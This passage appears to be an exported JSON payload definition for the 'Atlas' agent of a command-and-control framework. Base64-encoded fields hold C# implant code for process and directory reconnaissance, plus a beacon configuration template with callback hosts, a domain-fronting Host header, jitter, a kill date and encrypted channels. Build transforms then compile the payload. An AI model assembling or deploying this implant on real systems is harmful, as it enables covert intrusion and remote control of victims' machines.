bnRQdHIgaGFuZGxlOw0KICAgICAgICAgICAgICAgICAgICBPcGVuUHJvY2Vzc1Rva2VuKFByb2Nlc3MuSGFuZGxlLCA4LCBvdXQgaGFuZGxlKTsNCiAgICAgICAgICAgICAgICAgICAgdXNpbmcgKHZhciB3aW5JZGVudGl0eSA9IG5ldyBTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eShoYW5kbGUpKQ0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gd2luSWRlbnRpdHkuTmFtZTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBjYXRjaCAoSW52YWxpZE9wZXJhdGlvbkV4Y2VwdGlvbikNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHJldHVybiBzdHJpbmcuRW1wdHk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGNhdGNoIChTeXN0ZW0uQ29tcG9uZW50TW9kZWwuV2luMzJFeGNlcHRpb24pDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gc3RyaW5nLkVtcHR5Ow0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgcHJpdmF0ZSBzdHJ1Y3QgU1lTVEVNX0lORk8NCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBwdWJsaWMgdXNob3J0IHdQcm9jZXNzb3JBcmNoaXRlY3R1cmU7DQogICAgICAgICAgICAgICAgcHJpdmF0ZSB1c2hvcnQgd1Jlc2VydmVkOw0KICAgICAgICAgICAgICAgIHByaXZhdGUgdWludCBkd1BhZ2VTaXplOw0KICAgICAgICAgICAgICAgIHByaXZhdGUgSW50UHRyIGxwTWluaW11bUFwcGxpY2F0aW9uQWRkcmVzczsNCiAgICAgICAgICAgICAgICBwcml2YXRlIEludFB0ciBscE1heGltdW1BcHBsaWNhdGlvbkFkZHJlc3M7DQogICAgICAgICAgICAgICAgcHJpdmF0ZSBVSW50UHRyIGR3QWN0aXZlUHJvY2Vzc29yTWFzazsNCiAgICAgICAgICAgICAgICBwcml2YXRlIHVpbnQgZHdOdW1iZXJPZlByb2Nlc3NvcnM7DQogICAgICAgICAgICAgICAgcHJpdmF0ZSB1aW50IGR3UHJvY2Vzc29yVHlwZTsNCiAgICAgICAgICAgICAgICBwcml2YXRlIHVpbnQgZHdBbGxvY2F0aW9uR3JhbnVsYXJpdHk7DQogICAgICAgICAgICAgICAgcHJpdmF0ZSB1c2hvcnQgd1Byb2Nlc3NvckxldmVsOw0KICAgICAgICAgICAgICAgIHByaXZhdGUgdXNob3J0IHdQcm9jZXNzb3JSZXZpc2lvbjsNCiAgICAgICAgICAgIH07DQoNCiAgICAgICAgICAgIHByaXZhdGUgZW51bSBQbGF0Zm9ybQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHg4NiwNCiAgICAgICAgICAgICAgICB4NjQsDQogICAgICAgICAgICAgICAgSUE2NCwNCiAgICAgICAgICAgICAgICBVbmtub3duDQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIpXQ0KICAgICAgICAgICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIHZvaWQgR2V0TmF0aXZlU3lzdGVtSW5mbyhyZWYgU1lTVEVNX0lORk8gbHBTeXN0ZW1JbmZvKTsNCg0KICAgICAgICAgICAgcHJpdmF0ZSBzdGF0aWMgUGxhdGZvcm0gR2V0QXJjaGl0ZWN0dXJlKCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBjb25zdCB1c2hvcnQgUFJPQ0VTU09SX0FSQ0hJVEVDVFVSRV9JTlRFTCA9IDA7DQogICAgICAgICAgICAgICAgY29uc3QgdXNob3J0IFBST0NFU1NPUl9BUkNISVRFQ1RVUkVfSUE2NCA9IDY7DQogICAgICAgICAgICAgICAgY29uc3QgdXNob3J0IFBST0NFU1NPUl9BUkNISVRFQ1RVUkVfQU1ENjQgPSA5Ow0KDQogICAgICAgICAgICAgICAgdmFyIHN5c0luZm8gPSBuZXcgU1lTVEVNX0lORk8oKTsNCiAgICAgICAgICAgICAgICBHZXROYXRpdmVTeXN0ZW1JbmZvKHJlZiBzeXNJbmZvKTsNCg0KICAgICAgICAgICAgICAgIHN3aXRjaCAoc3lzSW5mby53UHJvY2Vzc29yQXJjaGl0ZWN0dXJlKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgY2FzZSBQUk9DRVNTT1JfQVJDSElURUNUVVJFX0FNRDY0Og0KICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFBsYXRmb3JtLng2NDsNCiAgICAgICAgICAgICAgICAgICAgY2FzZSBQUk9DRVNTT1JfQVJDSElURUNUVVJFX0lOVEVMOg0KICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFBsYXRmb3JtLng4NjsNCiAgICAgICAgICAgICAgICAgICAgY2FzZSBQUk9DRVNTT1JfQVJDSElURUNUVVJFX0lBNjQ6DQogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gUGxhdGZvcm0uSUE2NDsNCiAgICAgICAgICAgICAgICAgICAgZGVmYXVsdDoNCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBQbGF0Zm9ybS5Vbmtub3duOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldDQogICAgICAgICAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gYm9vbCBJc1dvdzY0UHJvY2VzcyhJbnRQdHIgaFByb2Nlc3MsIG91dCBib29sIFdvdzY0UHJvY2Vzcyk7DQoNCiAgICAgICAgICAgIHByaXZhdGUgc3RhdGljIGJvb2wgSXNXb3c2NChQcm9jZXNzIFByb2Nlc3MpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgdHJ5DQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBib29sIGlzV293NjQ7DQogICAgICAgICAgICAgICAgICAgIElzV293NjRQcm9jZXNzKFByb2Nlc3MuSGFuZGxlLCBvdXQgaXNXb3c2NCk7DQogICAgICAgICAgICAgICAgICAgIHJldHVybiBpc1dvdzY0Ow0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBjYXRjaCAoSW52YWxpZE9wZXJhdGlvbkV4Y2VwdGlvbikNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgY2F0Y2ggKFN5c3RlbS5Db21wb25lbnRNb2RlbC5XaW4zMkV4Y2VwdGlvbikNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIHByaXZhdGUgc3RhdGljIGludCBHZXRQYXJlbnRQcm9jZXNzKFByb2Nlc3MgUHJvY2VzcykNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICB0cnkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHJldHVybiBHZXRQYXJlbnRQcm9jZXNzKFByb2Nlc3MuSGFuZGxlKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgY2F0Y2ggKEludmFsaWRPcGVyYXRpb25FeGNlcHRpb24pDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gMDsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgY2F0Y2ggKFN5c3RlbS5Db21wb25lbnRNb2RlbC5XaW4zMkV4Y2VwdGlvbikNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHJldHVybiAwOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBVdGlscy5Qcm9jZXNzTGlzdCBHZXRQcm9jZXNzTGlzdCgpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgVXRpbHMuUHJvY2Vzc0xpc3QgcHJvY2Vzc19saXN0ID0gbmV3IFV0aWxzLlByb2Nlc3NMaXN0IHsgfTsNCiAgICAgICAgICAgICAgICB0cnkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHZhciBwcm9jZXNzb3JBcmNoaXRlY3R1cmUgPSBHZXRBcmNoaXRlY3R1cmUoKTsNCiAgICAgICAgICAgICAgICAgICAgUHJvY2Vzc1tdIHByb2Nlc3NlcyA9IFByb2Nlc3MuR2V0UHJvY2Vzc2VzKCkuT3JkZXJCeShQID0+IFAuSWQpLlRvQXJyYXkoKTsNCiAgICAgICAgICAgICAgICAgICAgZm9yZWFjaCAoUHJvY2VzcyBwcm9jZXNzIGluIHByb2Nlc3NlcykNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgVXRpbHMuUHJvY2VzcyBwcm9jZXNzX2luZm8gPSBuZXcgVXRpbHMuUHJvY2Vzcw0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByb2Nlc3NfaWQgPSBwcm9jZXNzLklkLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhcmVudF9wcm9jZXNzX2lkID0gR2V0UGFyZW50UHJvY2Vzcyhwcm9jZXNzKSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBuYW1lID0gcHJvY2Vzcy5Qcm9jZXNzTmFtZSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBiaW5fcGF0aCA9IHN0cmluZy5FbXB0eSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB1c2VyID0gR2V0UHJvY2Vzc093bmVyKHByb2Nlc3MpDQogICAgICAgICAgICAgICAgICAgICAgICB9Ow0KDQogICAgICAgICAgICAgICAgICAgICAgICBpZiAocHJvY2Vzc19pbmZvLnBhcmVudF9wcm9jZXNzX2lkICE9IDApDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcm9jZXNzX2luZm8uYmluX3BhdGggPSBwcm9jZXNzLk1haW5Nb2R1bGUuRmlsZU5hbWU7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhdGNoIChTeXN0ZW0uQ29tcG9uZW50TW9kZWwuV2luMzJFeGNlcHRpb24pIHsgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgICAgICAgICBpZiAocHJvY2Vzc29yQXJjaGl0ZWN0dXJlID09IFBsYXRmb3JtLng2NCkNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcm9jZXNzX2luZm8uYXJjaGl0ZWN0dXJlID0gIng2NCI7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJvY2Vzc19pbmZvLmFyY2hpdGVjdHVyZSA9ICJ4ODYiOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgcHJvY2Vzc19saXN0LnByb2Nlc3NfbGlzdC5BZGQocHJvY2Vzc19pbmZvKTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gcHJvY2Vzc19saXN0Ow0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBjYXRjaA0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHByb2Nlc3NfbGlzdDsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICAvLyBNb3N0IG9mIHRoaXMgY29kZSBpcyBkaXJlY3RseSBmcm9tIFNoYXJTcGxvaXQ6IGh0dHBzOi8vZ2l0aHViLmNvbS9jb2Jici9TaGFycFNwbG9pdA0KICAgICAgICBwdWJsaWMgc3RhdGljIFV0aWxzLkRpcmVjdG9yeUxpc3QgRGlyZWN0b3J5TGlzdGluZyhzdHJpbmcgUGF0aCkNCiAgICAgICAgew0KICAgICAgICAgICAgVXRpbHMuRGlyZWN0b3J5TGlzdCByZXN1bHRzID0gbmV3IFV0aWxzLkRpcmVjdG9yeUxpc3QoKTsNCiAgICAgICAgICAgIGlmIChGaWxlLkV4aXN0cyhQYXRoKSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBGaWxlSW5mbyBmaWxlSW5mbyA9IG5ldyBGaWxlSW5mbyhQYXRoKTsNCiAgICAgICAgICAgICAgICByZXN1bHRzLmRpcmVjdG9yeV9saXN0LkFkZChuZXcgVXRpbHMuRmlsZVN5c3RlbUVudHJ5DQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBmaWxlX25hbWUgPSBmaWxlSW5mby5GdWxsTmFtZSwNCiAgICAgICAgICAgICAgICAgICAgc2l6ZSA9IChpbnQpZmlsZUluZm8uTGVuZ3RoLA0KICAgICAgICAgICAgICAgICAgICB0aW1lc3RhbXAgPSBmaWxlSW5mby5MYXN0V3JpdGVUaW1lVXRjLlRvU3RyaW5nKCksDQogICAgICAgICAgICAgICAgICAgIElzRGlyID0gImZhbHNlIg0KICAgICAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGZvcmVhY2ggKHN0cmluZyBkaXIgaW4gRGlyZWN0b3J5LkdldERpcmVjdG9yaWVzKFBhdGgpKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgRGlyZWN0b3J5SW5mbyBkaXJJbmZvID0gbmV3IERpcmVjdG9yeUluZm8oZGlyKTsNCiAgICAgICAgICAgICAgICAgICAgcmVzdWx0cy5kaXJlY3RvcnlfbGlzdC5BZGQobmV3IFV0aWxzLkZpbGVTeXN0ZW1FbnRyeQ0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBmaWxlX25hbWUgPSBkaXJJbmZvLkZ1bGxOYW1lLA0KICAgICAgICAgICAgICAgICAgICAgICAgc2l6ZSA9IDAsDQogICAgICAgICAgICAgICAgICAgICAgICB0aW1lc3RhbXAgPSBkaXJJbmZvLkxhc3RXcml0ZVRpbWVVdGMuVG9TdHJpbmcoKSwNCiAgICAgICAgICAgICAgICAgICAgICAgIElzRGlyID0gInRydWUiDQogICAgICAgICAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBmb3JlYWNoIChzdHJpbmcgZmlsZSBpbiBEaXJlY3RvcnkuR2V0RmlsZXMoUGF0aCkpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBGaWxlSW5mbyBmaWxlSW5mbyA9IG5ldyBGaWxlSW5mbyhmaWxlKTsNCiAgICAgICAgICAgICAgICAgICAgcmVzdWx0cy5kaXJlY3RvcnlfbGlzdC5BZGQobmV3IFV0aWxzLkZpbGVTeXN0ZW1FbnRyeQ0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBmaWxlX25hbWUgPSBmaWxlSW5mby5GdWxsTmFtZSwNCiAgICAgICAgICAgICAgICAgICAgICAgIHNpemUgPSAoaW50KWZpbGVJbmZvLkxlbmd0aCwNCiAgICAgICAgICAgICAgICAgICAgICAgIHRpbWVzdGFtcCA9IGZpbGVJbmZvLkxhc3RXcml0ZVRpbWVVdGMuVG9TdHJpbmcoKSwNCiAgICAgICAgICAgICAgICAgICAgICAgIElzRGlyID0gImZhbHNlIg0KICAgICAgICAgICAgICAgICAgICB9KTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgICAgICByZXR1cm4gcmVzdWx0czsNCiAgICAgICAgfQ0KICAgIH0NCn0NCg=="
        },
        {
          "Uuid.txt": "VVVJRF9IRVJF"
        }
      ],
      "support_scripts": [
        {
          "name": "create_table",
          "script": "ZnVuY3Rpb24oaGVhZGVycywgZGF0YSl7CiAgdmFyIG91dHB1dCA9ICI8dGFibGUgc3R5bGU9J292ZXJmbG93OnNjcm9sbDt3aGl0ZS1zcGFjZTpub3dyYXA7d2lkdGg6MTAwJTtjb2xvcjp3aGl0ZScgY2xhc3M9J3RhYmxlLXN0cmlwZWQgdGFibGUtaG92ZXIgYm9yZGVyIGJvcmRlci1kYXJrIHNoYWRvdyB0YWJsZS1jb25kZW5zZWQgdGFibGUtZGFyayc+IjsKICBvdXRwdXQgKz0gIjx0cj4iOwogIGZvcih2YXIgaSA9IDA7IGkgPCBoZWFkZXJzLmxlbmd0aDsgaSsrKXsKICAgIG91dHB1dCArPSAiPHRoIHN0eWxlPSdiYWNrZ3JvdW5kLWNvbG9yOiMzOTM0ODU7Y29sb3I6d2hpdGU7aGVpZ2h0OjQwcHg7dGV4dC1hbGlnbjpsZWZ0O3BhZGRpbmc6MHB4IDBweCAwcHggMjBweDt3aWR0aDoiICsgaGVhZGVyc1tpXVsnc2l6ZSddICsgIicgb25jbGljaz1cInNvcnRfdGFibGUodGhpcylcIj4iICsgaGVhZGVyc1tpXVsnbmFtZSddLnRvVXBwZXJDYXNlKCkgKyAiPC90aD4iOwogIH0KICBvdXRwdXQgKz0gIjwvdHI+IjsKICBmb3IodmFyIGkgPSAwOyBpIDwgZGF0YS5sZW5ndGg7IGkrKyl7CiAgICBvdXRwdXQgKz0gIjx0ciBzdHlsZT0ndGV4dC1hbGlnbjpsZWZ0OyIgKyBkYXRhW2ldWydyb3ctc3R5bGUnXSArICInPiI7CiAgICBmb3IodmFyIGogPSAwOyBqIDwgaGVhZGVycy5sZW5ndGg7IGorKyl7CiAgICAgaWYoZGF0YVtpXVsnY2VsbC1zdHlsZSddLmhhc093blByb3BlcnR5KGhlYWRlcnNbal0pKXsKICAgICAgICBvdXRwdXQgKz0gIjx0ZCBzdHlsZT0ncGFkZGluZzowcHggMHB4IDBweCAyMHB4OyIgKyBkYXRhW2ldWydjZWxsLXN0eWxlJ11baGVhZGVyc1tqXVsnbmFtZSddXSArICInPiIgKyBkYXRhW2ldW2hlYWRlcnNbal1bJ25hbWUnXV0gKyAiPC90ZD4iOwogICAgIH0KICAgICBlbHNlewogICAgICAgIG91dHB1dCArPSAiPHRkIHN0eWxlPSdwYWRkaW5nOjBweCAwcHggMHB4IDIwcHgnPiIgKyBkYXRhW2ldW2hlYWRlcnNbal1bJ25hbWUnXV0gKyAiPC90ZD4iOwogICAgIH0KICAgIH0KICAgIG91dHB1dCArPSAiPC90cj4iOwogIH0KICBvdXRwdXQgKz0gIjwvdGFibGU+IjsKICByZXR1cm4gb3V0cHV0Owp9"
        },
        {
          "name": "collapsable",
          "script": "ZnVuY3Rpb24oaGVhZGVyLCBlbGVtZW50LCB1bmlxdWVfaWQpewoJLy90YWtlcyBpbiBpbmZvcm1hdGlvbiBhYm91dCB0aGUgaGVhZGVyIHRvIG1ha2UgYW5kIHRoZSBlbGVtZW50IHRvIGNvbGxhcHNlIHdpdGhpbiBpdCAoYXMgYSBzdHJpbmcpCgl2YXIgb3V0cHV0ID0gIjxkaXYgY2xhc3M9J2NhcmQnPjxkaXYgY2xhc3M9J2NhcmQtaGVhZGVyIGJvcmRlciBib3JkZXItZGFyayBzaGFkb3cnPjxhIGNsYXNzPSdidG4nIHR5cGU9J2J1dHRvbicgZGF0YS10b2dnbGU9J2NvbGxhcHNlJyBkYXRhLXRhcmdldD0nI2JzdGFzayIgKyB1bmlxdWVfaWQgKyAiJyBhcmlhLWV4cGFuZGVkPSdmYWxzZScgYXJpYS1jb250cm9scz0nYnN0YXNrIiArIHVuaXF1ZV9pZCArICInPiIrIGhlYWRlclsnbmFtZSddICsgIjwvYT48L2Rpdj4iOwogICAgICBvdXRwdXQgKz0gIjxkaXYgY2xhc3M9J2NvbGxhcHNlJyBpZD1cImJzdGFzayIgKyB1bmlxdWVfaWQgKyAiXCIgc3R5bGU9J3dpZHRoOjEwMCUnPiI7CiAgICAgIG91dHB1dCArPSAiPGRpdiBjbGFzcz0nYmctY2FyZC1ib2R5LWwyIGNhcmQtYm9keSBib3JkZXIgYm9yZGVyLWRhcmsgc2hhZG93Jz4iICsgZWxlbWVudCArICI8L2Rpdj48L2Rpdj48L2Rpdj4iOwogIHJldHVybiBvdXRwdXQ7Cn0="
        }
      ],
      "c2_profiles": {
        "default": [
          {
            "Config_temp.cs": "dXNpbmcgU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWM7Cm5hbWVzcGFjZSBBdGxhcwp7CiAgICBwdWJsaWMgY2xhc3MgQ29uZmlnCiAgICB7CiAgICAgICAgcHVibGljIHN0YXRpYyBMaXN0PHN0cmluZz4gQ2FsbGJhY2tIb3N0cyA9IG5ldyBMaXN0PHN0cmluZz4geyAiY2FsbGJhY2tfaG9zdDpjYWxsYmFja19wb3J0IiB9OwogICAgICAgIHB1YmxpYyBzdGF0aWMgTGlzdDxVdGlscy5TZXJ2ZXI+IFNlcnZlcnMgPSBuZXcgTGlzdDxVdGlscy5TZXJ2ZXI+IHsgfTsKICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBQYXlsb2FkVVVJRCA9ICIlVVVJRCUiOwogICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIFVVSUQgPSAiIjsKICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBVc2VyQWdlbnQgPSAiVVNFUl9BR0VOVCI7CiAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgSG9zdEhlYWRlciA9ICJkb21haW5fZnJvbnQiOwogICAgICAgIHB1YmxpYyBzdGF0aWMgaW50IFNsZWVwID0gY2FsbGJhY2tfaW50ZXJ2YWw7CiAgICAgICAgcHVibGljIHN0YXRpYyBpbnQgSml0dGVyID0gY2FsbGJhY2tfaml0dGVyOwogICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIEtpbGxEYXRlID0gImtpbGxkYXRlIjsKICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBQYXJhbSA9ICIlUEFSQU0lIjsKICAgICAgICBwdWJsaWMgY29uc3QgaW50IENodW5rU2l6ZSA9ICVDSFVOS19TSVpFJTsKICAgICAgICBwdWJsaWMgc3RhdGljIGJvb2wgRGVmYXVsdFByb3h5ID0gJURFRkFVTFRfUFJPWFklOwogICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIFByb3h5QWRkcmVzcyA9ICIlUFJPWFlfQUREUkVTUyUiOwogICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIFByb3h5VXNlciA9ICIlUFJPWFlfVVNFUiUiOwogICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIFByb3h5UGFzc3dvcmQgPSAiJVBST1hZX1BBU1NXT1JEJSI7CiNpZiAoREVGQVVMVCB8fCBERUZVTEFUX1BTSyB8fCBERUZBVUxUX0VLRSkKICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBVcmwgPSAiL2FwaS92MS40L2FnZW50X21lc3NhZ2UiOwojZW5kaWYKI2lmIChEZWZhdWx0X1BTSyB8fCBERUZBVUxUX0VLRSkKICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBQc2sgPSAiQUVTUFNLIjsKI2VuZGlmCiNpZiBERUZBVUxUX0VLRQogICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIFNlc3Npb25JZCA9ICIiOwogICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIHRlbXBVVUlEID0gIiI7CiAgICAgICAgcHVibGljIHN0YXRpYyBTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LlJTQUNyeXB0b1NlcnZpY2VQcm92aWRlciBSc2E7CiNlbmRpZgogICAgICAgIHB1YmxpYyBzdGF0aWMgRGljdGlvbmFyeTxzdHJpbmcsIHN0cmluZz4gTW9kdWxlcyA9IG5ldyBEaWN0aW9uYXJ5PHN0cmluZywgc3RyaW5nPigpOwogICAgfQp9"
          }
        ]
      },
      "load_transforms": [],
      "create_transforms": [
        {
          "parameter": "",
          "description": "",
          "transform": "atlas_stamp_parameters",
          "parameter_type": "None",
          "order": 10
        },
        {
          "parameter": "",
          "description": "Compile Atlas payload",
          "transform": "atlas_compile_and_return",
          "parameter_type": "None",
          "order": 11
        },
        {
          "parameter": "",
          "description": "(Optional) Specify the username to use to authenticate to the proxy server",
          "transform": "save_string_parameter",
          "parameter_type": "String",
          "order": 9
        },
        {
          "parameter": "",
          "description": "(Optional) Specify the password to use to authenticate to the proxy server",
          "transform": "save_string_parameter",
          "parameter_type": "String",
          "order": 8
        },
        {
          "parameter": "",
          "description": "(Optional) Specify the proxy address to use for web requests ",
          "transform": "save_string_parameter",
          "parameter_type": "String",
          "order": 7
        },
        {
          "parameter": "4.0\n3.5",
          "description": "",
          "transform": "save_parameter",
          "parameter_type": "ChooseOne",
          "order": 1
        },
        {
          "parameter": "true\nfalse",
          "description": "True will use the system's default proxy settings, false will use proxy settings specify below",
          "transform": "save_parameter",
          "parameter_type": "ChooseOne",
          "order": 6
        },
        {
          "parameter": "512000",
          "description": "Specify the chunking size to use for download\/upload and command output",
          "transform": "save_string_parameter",
          "parameter_type": "String",
          "order": 5
        },
        {
          "parameter": "id",
          "description": "Specify the query parameter to use for GET requests",
          "transform": "save_string_parameter",
          "parameter_type": "String",
          "order": 4
        },
        {
          "parameter": "DEFAULT_EKE\nDEFAULT_PSK\nDEFAULT",
          "description": "Profile\/encryption to use",
          "transform": "save_parameter",
          "parameter_type": "ChooseOne",
          "order": 3
        },
        {
          "parameter": "x64\nx86\nanycpu",
          "description": "Architecture to target when compiling",
          "transform": "save_parameter",
          "parameter_type": "ChooseOne",
          "order": 2
        }
      ],
      "transforms": [
        {
          "code": "YXN5bmMgZGVmIGF0bGFzX3VwbG9hZF9zaG9ydGhhbmQoc2VsZiwgdGFza19wYXJhbXM6c3RyLCBwYXJhbWV0ZXI6IE5vbmUpIC0+IHN0cjoNCiAgICBpbXBvcnQganNvbg0KICAgIGlmIGxlbih0YXNrX3BhcmFtcykgPT0gMDoNCiAgICAgICAgcmFpc2UgRXhjZXB0aW9uKCJNaXNzaW5nIHBhcmFtZXRlcnMiKQ0KICAgIGlmIHRhc2tfcGFyYW1zWzBdID09ICJ7IjoNCiAgICAgICAgcmV0dXJuIHRhc2tfcGFyYW1zDQogICAgcGllY2VzID0gdGFza19wYXJhbXMuc3BsaXQoIiAiKQ0KICAgIHRhc2tfZGljdCA9IHsiYXNzZW1ibHlfaWQiOiBwaWVjZXNbMF0sICJyZW1vdGVfcGF0aCI6ICcgJy5qb2luKHBpZWNlc1sxOl0pfQ0KICAgIHJldHVybiBqc29uLmR1bXBzKHRhc2tfZGljdCk=",
          "name": "atlas_upload_shorthand",
          "parameter_type": "None",
          "description": "Swap out filename for needed file_id",
          "is_command_code": true,
          "timestamp": "04\/06\/2020 02:33:32",
          "id": 3,
          "operator": "apfell_admin"
        },
        {
          "code": "YXN5bmMgZGVmIHN3YXBfc2hvcnRuYW1lcyhzZWxmLCB0YXNrX3BhcmFtczogc3RyLCBwYXJhbWV0ZXI6IE5vbmUpIC0+IHN0cjoNCiAgICAjIHNldHMgYSBmbGFnIHRvIHN3YXAgcGFyYW1ldGVycyB0aGF0IGVuZCBpbiBfaWQgd2l0aCBmaWxlbmFtZXMgaWYgdGhlIGN1cnJlbnQgdmFsdWUgZXhpc3RzIGFzIGEgZmlsZSBuYW1lDQogICAgaW1wb3J0IGpzb24NCiAgICB0cnk6DQogICAgICAgIHBhcmFtcyA9IGpzb24ubG9hZHModGFza19wYXJhbXMpDQogICAgICAgIHBhcmFtc1snc3dhcF9zaG9ydG5hbWVzJ10gPSBUcnVlDQogICAgICAgIHJldHVybiBqc29uLmR1bXBzKHBhcmFtcykNCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgIHByaW50KCJjYW4ndCBhZGQgc3dhcF9zaG9ydG5hbWVzIGZpZWxkIHNpbmNlIGl0J3Mgbm90IGpzb24iKQ0KICAgIHJldHVybiB0YXNrX3BhcmFtcw==",
          "name": "swap_shortnames",
          "parameter_type": "None",
          "description": "Swap *_id parameter filename to corresponding file_id",
          "is_command_code": true,
          "timestamp": "04\/06\/2020 02:33:32",
          "id": 2,
          "operator": "apfell_admin"
        },
        {
